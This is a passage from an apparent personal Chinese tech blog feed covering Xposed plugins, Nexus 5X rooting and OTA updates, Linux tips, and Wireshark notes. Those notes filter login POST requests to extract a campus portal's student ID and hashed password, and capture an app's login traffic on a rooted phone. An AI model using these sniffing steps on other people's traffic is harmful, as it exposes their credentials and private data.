<li>下载安装插件,启用之后进行软重启(比较快)</li>
</ol>
<h2 id="推荐几个插件"><a href="#推荐几个插件" class="headerlink" title="推荐几个插件"></a>推荐几个插件</h2><p>ActivityForceNewTask 强制开新任务<br>不装LBE就用<code>greenify</code>,root的休眠功能+xposed扩展非常棒<br>阻止运行: Prevent Running<br>禁止唤醒: No WakeLock 作者Blog:<a href="https://www.linangran.com/?p=611" target="_blank" rel="external">Angran Lin’s Blog</a> (试用了发现也就这样,卸载了)<br>开机管理: BootManager<br><del>权限管理: XPrivacy 控制太烦,而且原生已有权限控制,弃用</del><br><del>广告过滤: MinMinGuard 怕过滤规则过严,弃用</del><br><del>Ist保存插件: Instagram Downloader 很早之前能用</del><br>禁止内置浏览器: ExLink(去你大爷的浏览器)<br>状态栏+底栏颜色优化,很棒: PerfectColorBar<br>来电显示: Phone Location<br>自定义手电筒快捷键: Xposed Torch<br>防撤回: QQUnrecalled/WechatUnrecalled(别干坏事..)</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="http://www.inexus.co/article-3823-1.html" target="_blank" rel="external">Inexus-Xposed安装</a><br><a href="http://forum.xda-developers.com/showpost.php?p=58828974" target="_blank" rel="external">XDA</a><br>插件推荐: <a href="https://www.zhihu.com/question/22063862" target="_blank" rel="external">==知乎链接==</a><br>刚找到的一个新地址: <a href="http://xposed.appkg.com/1051.html" target="_blank" rel="external">Xposed</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Nexus原生OTA升级(ROOT+XP),无需PC]]></title>
      <url>http://csser.work/03/30/2016/device-nexus-ota-update/</url>
      <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Nexus5x Rooted Xposed</p>
<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ol>
<li>不需要PC 2. 不需要清数据 3. 可以顺便安装Xposed</li>
</ol>
<p><code>自己是先卸载了Xposed之后再升级的,没卸载的升级没有尝试过</code></p>
<h3 id="正"><a href="#正" class="headerlink" title="正"></a>正</h3><p>这个我就不多讲了,需要的软件<code>Flashfire</code><br>更新软件包: <a href="https://developers.google.com/android/nexus/images" target="_blank" rel="external">Nexus_Factory_images</a><br>Xposed框架地址: <a href="http://dl-xda.xposed.info/framework/" target="_blank" rel="external">Xposed</a></p>
<p>直接上地址(墙):</p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/ED6N4DJTaU4" frameborder="0" allowfullscreen></iframe>

<h2 id="结合PC的ota"><a href="#结合PC的ota" class="headerlink" title="结合PC的ota"></a>结合PC的ota</h2><p>这个自己没用过.需要的自己看一下,<code>不需要清数据</code><br><a href="https://m.reddit.com/r/nexus5x/comments/44duji/rooted_it_how_to_apply_the_ota_update/" target="_blank" rel="external">reddit</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[wireshark小记]]></title>
      <url>http://csser.work/03/28/2016/net-wireshark-test/</url>
      <content type="html"><![CDATA[<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><p><a href="http://www.yunsec.net/a/school/wlcs/agreement/2012/0317/10262.html" target="_blank" rel="external">TCP握手状态</a><br><a href="https://community.emc.com/message/818739#818739" target="_blank" rel="external">EMC_wireshark</a><br><a href="https://en.wikipedia.org/wiki/OSI_model" target="_blank" rel="external">OSI模型</a>应用层-&gt;SSL-&gt;TCP-&gt;IP</p>
<h2 id="杭电"><a href="#杭电" class="headerlink" title="杭电"></a>杭电</h2><p>直接用这个过滤</p>
<blockquote>
<p>http &amp;&amp; http.request.method==”POST”</p>
</blockquote>
<p><img src="/imgs/wireshark/hdu_1.png" alt="1"><br>直接得出表段:学号,密码(经验证为MD5)<br>echo -n password | openssl md5</p>
<h2 id="163邮箱"><a href="#163邮箱" class="headerlink" title="163邮箱"></a>163邮箱</h2><p>测试帐号名: ji2hanpgf </p>
<blockquote>
<p>老方法过滤出IP<br>http &amp;&amp; http.request.method==”POST”</p>
</blockquote>
<p>0x00. ip筛选,打算看一下过程,linux下默认启用ssl登陆..</p>
<blockquote>
<p><a href="https://ask.wireshark.org/questions/22230/filter-for-partial-ip-address" target="_blank" rel="external">ask.wireshark</a><br>ip.dst_host matches “^123.58.”</p>
</blockquote>
<p>0x01. 查找第一个握手包,加上指定地址,ip.addr不会用通配符</p>
<blockquote>
<p>(ip.src_host matches “^123.58.” || ip.dst_host matches “^123.58.”) &amp;&amp; tcp.flags.syn == 1</p>
</blockquote>
<p>0x02. TCP Stream<br><img src="/imgs/wireshark/maill_163_1.png" alt="2">看到<code>GeoTrust SSL</code>字样,查了一下163采用了这个ssl服务<br>在这里也看到了tcp的完整握手流程,cli-&gt;serv-&gt;cli  </p>
<p>0x03. 1226th TLSv1.2<br>在最上层中secure sockets layer中看到Pubkey(length:65),这个和搜到的也是一致(server将公钥发给client,之后client进行加密传输)<br><img src="/imgs/wireshark/mail_163_2.png" alt="3"></p>
<p>0x04. 继续ip过滤,之后看到一条重要的消息1268th,1233rd. length都上千 Application Data,打开后在最后看到encrypt Data字样, </p>
<p>0x05.<br><img src="/imgs/wireshark/mail_163_3.png" alt="3"><br>中找到cipher suite字样,看到加密类型是<code>TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA(0xc013)</code>,查了一下,</p>
<blockquote>
<p>正向保密 <a href="http://www.infoq.com/cn/articles/keeping-your-secrets" target="_blank" rel="external">infoQ</a><br>那个密码套件的名称看起来相当神秘，但如果你把它拆开来看就很好懂了。 “TLS” 自然是指TLS协议。 “ECDHE” 是说使用带有短暂性密钥的椭圆曲线Diffie-Hellman密钥交换（也就是说要为每个会话创建新密钥并且事后也不会记下来）。“RSA”表明用RSA 非对称加密保护TLS握手的安全。 “AES_128_CBC” 是说在密码块链接模式中用带有128位密钥的AES 非对称加密保护真正的数据交换。最后的 “SHA” 表明用 SHA 安全哈希算法。<br>这可能是在Oracle的Java 7上用TLS 1.1所能用到的最好密码套件。如果用TLS 1.2 ，你可以升级成TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256，使用更强(也更安全)的 SHA2 摘要算法。理想情况下，用GCM（伽罗瓦​​/计数器模式）之类的模式代替CBC更好，但Oracle的 Java 7 JSSE (Java 安全套接字扩展)实现还不支持。<br>你可能还要考虑从 “ECDHE” 去掉“EC”。密码学大师布鲁斯·施奈尔现在推荐优先选用离散对数而不是椭圆曲线加密 (在这篇文章中还有很多非常棒的建议，教你如何保证自己以及你的数据交换的安全)。椭圆曲线技术更快，但可能会有政府组织故意引入的弱点。但大多数商业安全网站目前似乎只支持Diffie-Hellman的椭圆曲线版本，所以这个例子里就用它了。</p>
</blockquote>
<p>看了介绍,已经知道无解了..结束</p>
<h2 id="qq-Client"><a href="#qq-Client" class="headerlink" title="qq Client"></a>qq Client</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>QQLite win10(虚拟机) mac地址: 00-0C-29-A7-AA-00 包采用的是UDP定向包(高级设置)</p>
<blockquote>
<p><a href="https://www.zhihu.com/question/20292749/answer/18294472" target="_blank" rel="external">知乎-向小刚</a><br>登陆采用TCP协议和HTTP协议，你和好友之间发送消息，主要采用UDP协议，内网传文件采用了P2P技术。总来的说：<br>1.登陆过程，客户端client 采用TCP协议向服务器server发送信息，HTTP协议下载信息。登陆之后，会有一个TCP连接来保持在线状态。<br>2.和好友发消息，客户端client采用UDP协议，但是需要通过服务器转发。腾讯为了确保传输消息的可靠，采用上层协议来保证可靠传输。如果消息发送失败，客户端会提示消息发送失败，并可重新发送。<br>3.如果是在内网里面的两个客户端传文件，QQ采用的是P2P技术，不需要服务器中转。</p>
</blockquote>
<p>0x00. oicq过滤,找到最早一条,之后用<code>ip.addr==183.232.127.253</code>直接过滤出两者交互状态</p>
<p>0x01.<br><img src="/imgs/wireshark/qq_udp_1.png" alt="3"> QQ号 版本号 etc</p>
<p>0x02.<br><img src="/imgs/wireshark/qq_udp_2.png" alt="4"> 防止帐号在同一台设备登陆?<br><img src="/imgs/wireshark/qq_udp_3.png" alt="5"> 这个前缀很多,而且cli和server端都有,算是保证无连接状态的稳定性?<br>上面的reference中提到是tcp传输数据,不过感觉好奇怪…前面有4个UDP协议的端口交换过程,从该图看到应该是搜集client设备信息,Data是一串数字+字母,看起来只是校验而已<br>,之后才是OICQ的传输</p>
<p>0x03. OICQ分析<br><del>从图中看的话,有Data,len为38,</del>  <a href="#Reference">Reference</a>了解到Seq和Ack Number的关系,client发送了两个数据,并且有相同的头,返回也有固定格式,基于UDP这种无连接方式,参考知乎牛说的,直接可以无视UDP了,直接看TCP</p>
<p>0x04. TCP分析-1<br><img src="/imgs/wireshark/qq_udp_4.png" alt="6"><br><del>图中的三次握手和四次挥手还是非常明显<code>http://dldir1.qq.com/qqfile/status/qqcam-logo.png</code>,看了半天发现登陆到退出,全过程只是接受了一张小图片,上客户端找半天也没找到..</del> 没用,扔了</p>
<p>0x05. TCP分析-2<br><img src="/imgs/wireshark/qq_udp_5.png" alt="7"><br>抓到一个地址<code>183.232.127.254/cgi-bin.httpconn</code>,搜了一下是tx的后台(c++)<br>用POSTMan传了一个数据,返回200,len不对,和抓的包一致,网上查这个路径也说不上来,感觉就这个路径啦,完结= =</p>
<h2 id="JD客户端抓包"><a href="#JD客户端抓包" class="headerlink" title="JD客户端抓包"></a>JD客户端抓包</h2><h3 id="环境-1"><a href="#环境-1" class="headerlink" title="环境"></a>环境</h3><p>Android6.0.1(ROOTed) tcpdump抓取 5.x及以上需要下载具有PIE的tcpdump</p>
<h3 id="dcpdump安装"><a href="#dcpdump安装" class="headerlink" title="dcpdump安装"></a>dcpdump安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">adb push ./Downloads/tcpdump /sdcard</span><br><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line">mv /sdcard/tcpdump /data/local/tcpdump &amp;&amp; cd /data/local</span><br><span class="line">chmod 6775 ./tcpdump</span><br><span class="line">./tcpdump -i any -p -s 0 -w /sdcard/phoneCapture.pcap</span><br><span class="line"># Ctrl+C 停止拦截</span><br><span class="line">adb pull /sdcard/phoneCapture.pcap</span><br></pre></td></tr></table></figure>
<h3 id="登陆过程"><a href="#登陆过程" class="headerlink" title="登陆过程"></a>登陆过程</h3><p>由于保存过密码自动登陆,查看过个人页面,之后退出登陆,后重新输入密码进行登陆</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>0x00. 直接http进行过滤</p>
<p>0x01.<br><img src="/imgs/wireshark/jd_1.png" alt="8"> 进入客户端的状态,评价,收获等界面</p>
<p>0x02. <img src="/imgs/wireshark/jd_2_info.png" alt="9"> 进入客户端之后后端传过来的数据</p>
<p>0x03.<br><img src="/imgs/wireshark/jd_login_3.png" alt="10"><br><img src="/imgs/wireshark/jd_login_4.png" alt="11">这些包中分析出来在<code>/stat/access</code>中将一段<code>Key[truncated]</code><br>传给服务器,尝试base64,然并卵= =,上图 <img src="/imgs/wireshark/jd_key_.png" alt="12"></p>
<p>还有个<code>/login_report/</code>base64解出来是这么个东西<img src="/imgs/wireshark/jd-login_report.png" alt="13">,后面正常,前面这个感觉像个校验码.</p>
<p>基本也能确定了,密码差不多就是那个form表单的key了,不过加密不知道的话也没什么卵用</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>资料:SSL<br>参考至<a href="">SSL与TLS</a>,Eric Rescorla著:<br>ssl流程(一般用于HTTPS):HTTP建立TCP连接之后,并在其中建立一条SSL隧道,之后在SSL隧道中发送同样的请求,服务器则以相同的方式用SSL进行相应<br>SSL握手流程:<a href="http://www.cnblogs.com/happyhippy/archive/2007/05/14/746476.html" target="_blank" rel="external">CSDN</a><br><a href="http://blog.chinaunix.net/uid-26833883-id-3627644.html" target="_blank" rel="external">TCP/UDP/IP协议分析_程姚根</a><br><a href="http://blog.csdn.net/hldjf/article/details/7450565" target="_blank" rel="external">TCP-PDU</a><br><a href="http://blog.csdn.net/chenglian_999/article/details/4672177" target="_blank" rel="external">Vim-16进制</a><br><a href="http://man.chinaunix.net/newsoft/ApacheManual/howto/cgi.html" target="_blank" rel="external">Apache2-CGI</a><br><a href="https://www.zhihu.com/question/21432096" target="_blank" rel="external">CGI-知乎</a><br><a href="http://www.trinea.cn/android/tcpdump_wireshark/" target="_blank" rel="external">Android抓包_Trinea</a><br><a href="http://blog.sina.com.cn/s/blog_89fa41ef0102w18c.html" target="_blank" rel="external">linux cooked capture</a><br><a href="http://www.yunsec.net/a/school/wlcs/agreement/2012/0317/10262.html" target="_blank" rel="external">TCP状态</a><br><a href="https://jimshaver.net/2015/02/11/decrypting-tls-browser-traffic-with-wireshark-the-easy-way/" target="_blank" rel="external">听说能拆SSL?</a><br><a href="http://www.cnblogs.com/happyhippy/archive/2007/05/14/746476.html" target="_blank" rel="external">SSL握手</a><br><a href="http://blog.csdn.net/hursing/article/details/20543837" target="_blank" rel="external">wireshark-SSLv3</a><br><a href="http://bbs.51cto.com/thread-886816-1.html" target="_blank" rel="external">51CTO- 有关QQ登录服务器（UDP与TCP）</a><br><a href="http://www.cnblogs.com/Heart-J/p/4580849.html" target="_blank" rel="external">山鹰-qq</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[ubuntu chrome cpu25%]]></title>
      <url>http://csser.work/03/20/2016/linux-ubuntu-chrome/</url>
      <content type="html"><![CDATA[<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Description:  Ubuntu 15.04 vivid<br>Chrome Version: 50.0.2661.26 beta x64</p>
<h2 id="Issue"><a href="#Issue" class="headerlink" title="Issue"></a>Issue</h2><p>开启Chrome之后,风扇开始转,monitor看到<code>gnome-keyring-daemon</code>cpu占用达到阈值</p>
<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>搜索了一下发现是chrome对gnome-keyring-daemon的调用太多,但ubuntu默认的memlock应该在1M以内,<br>所以造成无法写入并一直尝试写入而导致的cpu占用.</p>
<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><p>永久关闭keyring服务(鉴于ubuntu恶心的包依赖)之后重启</p>
<blockquote>
<p>sudo chmod -x /usr/bin/gnome-keyring</p>
</blockquote>
<h2 id="后遗症"><a href="#后遗症" class="headerlink" title="后遗症"></a>后遗症</h2><p>发现开启多个tab之后风扇依然呼呼转,但是cpu使用率却在5%以下,这个就不知道怎么解决了..</p>
<h2 id="弯路"><a href="#弯路" class="headerlink" title="弯路"></a>弯路</h2><p>根据reference2通过修改<code>/etc/security/limits.conf</code>将memlock提高至10000<br>重启之后更要命,磁盘一直以10M/s的速度在进行写入,自己也不不清楚,所以重新恢复原样</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>阅读顺序:</p>
<ol>
<li><a href="https://productforums.google.com/forum/#!topic/chrome/0nLjeCisf1A" target="_blank" rel="external">Chrome-help-forum</a></li>
<li><a href="http://stackoverflow.com/questions/34588/how-do-i-change-the-number-of-open-files-limit-in-linux" target="_blank" rel="external">Linux-limit</a></li>
<li><a href="http://askubuntu.com/questions/3045/how-to-disable-gnome-keyring" target="_blank" rel="external">How to disable GNOME keyring</a></li>
</ol>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[Nexus 5x解锁+第三方]]></title>
      <url>http://csser.work/03/19/2016/device-nexus-flashing/</url>
      <content type="html"><![CDATA[<h2 id="0x0环境"><a href="#0x0环境" class="headerlink" title="0x0环境"></a>0x0环境</h2><p>Device: Nexus 5x marshmallow(Android 6.01)<br>Description:  Ubuntu 14.04<br>DevEnv: SDK<br>Files in need: </p>
<h2 id="0x1-解锁Bootloader"><a href="#0x1-解锁Bootloader" class="headerlink" title="0x1 解锁Bootloader"></a>0x1 解锁Bootloader</h2><h3 id="Warning"><a href="#Warning" class="headerlink" title="Warning"></a>Warning</h3><p><code>**该操作会清除手机数据,请及时备份**</code></p>
<h3 id="正"><a href="#正" class="headerlink" title="正"></a>正</h3><ol>
<li>安装好adb和fastboot驱动: <a href="http://my.oschina.net/myaniu/blog/103385" target="_blank" rel="external">玛雅牛</a></li>
<li>unlock bootloader<br>先开启usb debug和OEM unlocking,之后Ubuntu更改为root权限<code>sudo -i</code><blockquote>
<p>adb devices<br>adb reboot-bootloader<br>fastboot devices<br>fastboot oem unlock</p>
</blockquote>
</li>
</ol>
<p>解锁之后的state会变成unlock而且开机会有警告,之后用开机键进行启动<br>保修的话用<code>fastboot flashing lock</code>来恢复锁定</p>
<h3 id="刷完之后的坑"><a href="#刷完之后的坑" class="headerlink" title="刷完之后的坑"></a>刷完之后的坑</h3><p>此时手机配置已经完全失效,<code>重新进入开发者模式选择USB-debug</code></p>
<h2 id="0x2-刷入第三方Recovery-twrp"><a href="#0x2-刷入第三方Recovery-twrp" class="headerlink" title="0x2 刷入第三方Recovery-twrp"></a>0x2 刷入第三方<a href="https://dl.twrp.me/bullhead/" target="_blank" rel="external">Recovery-twrp</a></h2><p>该版本适用于Nexus<code>5x</code>,其他版本请移步<a href="https://twrp.me/Devices/" target="_blank" rel="external">twrp-device</a>进行查询</p>
<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>一定要检查md5,否则会出现如下问题:<br><strong>FAILED (remote: image is not a boot image)</strong></p>
<blockquote>
<p>md5sum twrp-3.0.0-1-bullhead.img</p>
</blockquote>
<h3 id="正-1"><a href="#正-1" class="headerlink" title="正"></a>正</h3><blockquote>
<p>root@dell:/home/hexlism/Downloads# fastboot flash recovery twrp-3.0.0-1-bullhead.img </p>
</blockquote>
<p>如果成功刷入,则应该显示:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">target reported max download size of 536870912 bytes</span><br><span class="line">sending &apos;recovery&apos; (16345 KB)...</span><br><span class="line">OKAY [  0.471s]</span><br><span class="line">writing &apos;recovery&apos;...</span><br><span class="line">OKAY [  0.154s]</span><br><span class="line">finished. total time: 0.625s</span><br></pre></td></tr></table></figure></p>
<p>刷完之后又多一个警告=, =</p>
<h2 id="刷入SuperSu"><a href="#刷入SuperSu" class="headerlink" title="刷入SuperSu"></a>刷入SuperSu</h2><p>当前版本为:BETA-SuperSU-v2.68-20160228150503.zip,下载地址在<code>Reference 0x4</code></p>
<ol>
<li><p>放入supersu文件:</p>
<blockquote>
<p>adb push BETA-SuperSU-v2.68-20160228150503.zip /sdcard/Downloads</p>
</blockquote>
</li>
<li><p>进入bootloader模式–关机状态,电源+音量下 (或者用命令)</p>
</li>
<li>选择recovery mode (前提有twrp)</li>
<li>在twrp中选择install,之后选择push进去的zip文件即可</li>
</ol>
<h3 id="坑"><a href="#坑" class="headerlink" title="坑"></a>坑</h3><p>我碰到的问题让我虚惊一场,连续三次重启之后成功启动.差点哭晕</p>
<p>如果twrp提示需要刷入supersu,选择<code>**don&#39;t**</code>,不过我在这个过程中完全没有碰到这个问题</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>0x0. 主要参考 <a href="http://www.inexus.co/thread-23604-1-1.html" target="_blank" rel="external">http://www.inexus.co/thread-23604-1-1.html</a><br>0x1. ADB<br><a href="http://www.makeuseof.com/tag/new-adb-make-process-simple-easy/" target="_blank" rel="external">ADB</a><br><a href="http://www.inexus.co/thread-23604-1-1.html" target="_blank" rel="external">http://www.inexus.co/thread-23604-1-1.html</a><br><a href="http://www.inexus.co/article-2823-1.html" target="_blank" rel="external">fastboot-adb</a><br>0x2. bootloader<br><a href="http://www.inexus.co/thread-18509-1-1.html" target="_blank" rel="external">inexus</a><br><a href="http://rootmygalaxy.net/how-to-unlock-lg-google-nexus-5x-bootloader-easily/" target="_blank" rel="external">rootmygalaxy</a><br><a href="http://www.androidcentral.com/how-unlock-nexus-5x-bootloader" target="_blank" rel="external">androidcentral</a><br>0x3. Third recovery<br><a href="http://www.inexus.co/thread-23627-1-1.html" target="_blank" rel="external">inexus-recovery</a><br>0x4. <a href="http://download.chainfire.eu/supersu" target="_blank" rel="external">SuperSu</a><br>ADB 命令:<a href="http://bbs.gfan.com/android-4421095-1-1.html" target="_blank" rel="external">gfan</a></p>
<h2 id="后续开启Google-Now"><a href="#后续开启Google-Now" class="headerlink" title="后续开启Google Now"></a>后续开启Google Now</h2><p>不需要模拟地址,不需要拔卡,不过<code>需要root</code><br>一件开启=====&gt;&gt;<a href="http://www.coolapk.com/apk/com.czbix.nowenabler" target="_blank" rel="external">酷安-Google Now Enabler</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[linux日常更新-02]]></title>
      <url>http://csser.work/03/05/2016/daily-linux-2/</url>
      <content type="html"><![CDATA[<p>#环境:Ubuntu</p>
<h2 id="Commond"><a href="#Commond" class="headerlink" title="Commond"></a>Commond</h2><h3 id="command快捷键emacs"><a href="#command快捷键emacs" class="headerlink" title="command快捷键emacs"></a>command快捷键emacs</h3><p>Ctrl+u  删除当前输入</p>
<h3 id="查询公网IP"><a href="#查询公网IP" class="headerlink" title="查询公网IP"></a>查询公网IP</h3><blockquote>
<p><a href="http://gaodi2002.blog.51cto.com/" target="_blank" rel="external">高迪</a><br>curl ifconfig.me<br>curl ipinfo.io</p>
</blockquote>
<h2 id="System"><a href="#System" class="headerlink" title="System"></a>System</h2><h3 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h3><p>(Ubuntu12.04+?)</p>
<blockquote>
<p>sudo service network-manager start/stop/restart    // network Interface, useless</p>
</blockquote>
<p>DNS(temporary):</p>
<pre><code>&gt;sudo vi /etc/resolv.conf
</code></pre><p>DNS(forever):</p>
<pre><code>&gt;sudo vi /etc/resolvconf/resolv.conf.d/base
</code></pre><p>Address,Netmask,Getway:</p>
<pre><code>&gt;sudo vi /etc/network/interfaces
</code></pre><h3 id="Shell转义"><a href="#Shell转义" class="headerlink" title="Shell转义"></a>Shell转义</h3><table>
<thead>
<tr>
<th style="text-align:center">字符</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>‘’</code>(单引号)</td>
<td style="text-align:center">硬转义，其内部所有的shell 元字符、通配符都会被关掉。注意，硬转义中不允许出现<code>’</code></td>
</tr>
<tr>
<td style="text-align:center"><code>“”</code>(双引号)</td>
<td style="text-align:center">软转义，其内部只允许出现特定的shell 元字符：<code>$</code>用于参数代换 `  用于命令代替</td>
</tr>
<tr>
<td style="text-align:center"><code>\</code>(反斜杠)</td>
<td style="text-align:center">转义，去除其后紧跟的元字符或通配符的特殊意义。</td>
</tr>
</tbody>
</table>
<p>Reference: <a href="http://www.cnblogs.com/chengmo/archive/2010/10/17/1853344.html" target="_blank" rel="external">程默’s Linux</a></p>
<h3 id="系统保存的desktop目录"><a href="#系统保存的desktop目录" class="headerlink" title="系统保存的desktop目录"></a>系统保存的desktop目录</h3><blockquote>
<p>/usr/share/applications/</p>
</blockquote>
<h3 id="系统添加证书"><a href="#系统添加证书" class="headerlink" title="系统添加证书"></a>系统添加证书</h3><p>1.将证书ca-certificates.crt入 <code>/etc/ssl/certs</code>目录下<br>然后更新证书<code>sudo  update-ca-certificates</code><br>2.&gt;<a href="http://blog.kissdata.com/2014/06/16/ubuntu-crt-proxy.html" target="_blank" rel="external">kissdata</a>,自己暂时没有尝试过<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 在 /usr/share/ca-certificates 目录下新建存放证书所对应的网站目录，这里以 github 为例进行说明</span></span><br><span class="line">sudo mkdir /usr/share/ca-certificates/github.com/</span><br><span class="line"><span class="comment">## 进入到所创建好的目录，这里使用了一种 !!:2 来指代上面的目录，索引从0开始，即 sudo对应0，mkdir对应1</span></span><br><span class="line"><span class="built_in">cd</span> !!:2</span><br><span class="line"><span class="comment">## 将准备好的要导入的证书复制到当前目录下</span></span><br><span class="line">sudo cp /path/to//github.com.crt .</span><br><span class="line"><span class="comment">## 运行配置命令导入，运行此命令后会出现类似下图所示的配置选项，相应配置即可</span></span><br><span class="line">sudo dpkg-reconfigure ca-certificates</span><br><span class="line"><span class="comment">## 配置好后再更新一下</span></span><br><span class="line">sudo update-ca-certificates</span><br></pre></td></tr></table></figure></p>
<p>Reference:<br><a href="http://superuser.com/questions/327471/why-do-i-get-a-certificate-error-trying-to-setup-a-ubuntu-cloud" target="_blank" rel="external">superuser</a></p>
<h3 id="GUI界面设置自启动"><a href="#GUI界面设置自启动" class="headerlink" title="GUI界面设置自启动"></a>GUI界面设置自启动</h3><blockquote>
<p><a href="http://www.linuxidc.com/Linux/2013-04/83060.htm" target="_blank" rel="external">Linuxidc-byguess</a><br>gnome-session-properties</p>
</blockquote>
<h3 id="更改默认语言"><a href="#更改默认语言" class="headerlink" title="更改默认语言"></a>更改默认语言</h3><p><a href="http://tonychiu.blog.51cto.com/656605/393131" target="_blank" rel="external">qiujichun</a></p>
<h3 id="手动添加字体-16-04"><a href="#手动添加字体-16-04" class="headerlink" title="手动添加字体(16.04)"></a>手动添加字体(16.04)</h3><p><a href="http://my.oschina.net/itblog/blog/278566" target="_blank" rel="external">oschina_摆渡者</a></p>
<h3 id="unity中彻底清除最近打开文档-视频-的历史记录"><a href="#unity中彻底清除最近打开文档-视频-的历史记录" class="headerlink" title="unity中彻底清除最近打开文档(视频)的历史记录"></a>unity中彻底清除最近打开文档(视频)的历史记录</h3><blockquote>
<p><a href="http://forum.ubuntu.org.cn/viewtopic.php?t=337582" target="_blank" rel="external">ubuntu1023</a><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#文档的历史记录</span></span><br><span class="line">rm ~/.local/share/zeitgeist/activity.sqlite &amp;&amp; zeitgeist-daemon --replace</span><br><span class="line"><span class="comment">#播放器中的“最近打开”的历史记录</span></span><br><span class="line">rm -v ~/.local/share/recently-used.xbel</span><br></pre></td></tr></table></figure></p>
</blockquote>
<h3 id="桌面快捷方式"><a href="#桌面快捷方式" class="headerlink" title="桌面快捷方式"></a>桌面快捷方式</h3><p><a href="http://os.51cto.com/art/201311/418841.htm" target="_blank" rel="external">51CTO</a><br><a href="http://www.howopensource.com/2012/10/create-application-launcher-add-icon-to-unity-ubuntu-12-10/" target="_blank" rel="external">howopensource</a></p>
<h3 id="清垃圾"><a href="#清垃圾" class="headerlink" title="清垃圾"></a>清垃圾</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#清apt缓存</span></span><br><span class="line">sudo apt-get autoclean</span><br><span class="line">sudo apt-get clean</span><br></pre></td></tr></table></figure>
<p><code>autoremove慎用</code><br>其他请看<a href="http://www.cnblogs.com/yc_sunniwell/archive/2010/07/15/1778265.html#undefined" target="_blank" rel="external">cnblogs-yc_sunniwell</a></p>
<h2 id="SoftWare"><a href="#SoftWare" class="headerlink" title="SoftWare"></a>SoftWare</h2><h3 id="Vmware-突然没法上网"><a href="#Vmware-突然没法上网" class="headerlink" title="Vmware 突然没法上网"></a>Vmware 突然没法上网</h3><p>Edit-&gt;NetWork Setting-&gt;手动更改子网并分配Ip</p>
<h3 id="Vmware-卸载"><a href="#Vmware-卸载" class="headerlink" title="Vmware 卸载"></a>Vmware 卸载</h3><p><a href="http://blog.csdn.net/allenlinrui/article/details/7269980" target="_blank" rel="external">Allen的技术天空</a></p>
<h3 id="LAMP套件"><a href="#LAMP套件" class="headerlink" title="LAMP套件"></a>LAMP套件</h3><p><a href="http://howtoubuntu.org/how-to-install-lamp-on-ubuntu" target="_blank" rel="external">HowToUbunutu</a></p>
<h3 id="gtk错误"><a href="#gtk错误" class="headerlink" title="gtk错误"></a>gtk错误</h3><p>错误描述:</p>
<blockquote>
<p>Gtk-WARNING **: 无法在模块路径中找到主题引擎：“pixmap”？</p>
</blockquote>
<p>解决:安装以下依赖包</p>
<blockquote>
<p>gtk2-engines-pixbuf</p>
</blockquote>
<h3 id="编译安装源码"><a href="#编译安装源码" class="headerlink" title="编译安装源码"></a>编译安装源码</h3><p>不行则请用root权限调用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 解压</span></span><br><span class="line">tar jxvf file.tar.bz2    /    tar zxvf file.tar.gz</span><br><span class="line"><span class="built_in">cd</span> file</span><br><span class="line">ls <span class="_">-l</span>      <span class="comment">#一般能找到INSTALL或者Doc安装文档</span></span><br><span class="line"><span class="comment"># 编译</span></span><br><span class="line">./configure;make ;make install</span><br><span class="line"><span class="comment"># 有些不需要configure</span></span><br><span class="line">make; make install</span><br></pre></td></tr></table></figure>
<h3 id="定制安装"><a href="#定制安装" class="headerlink" title="定制安装"></a>定制安装</h3><blockquote>
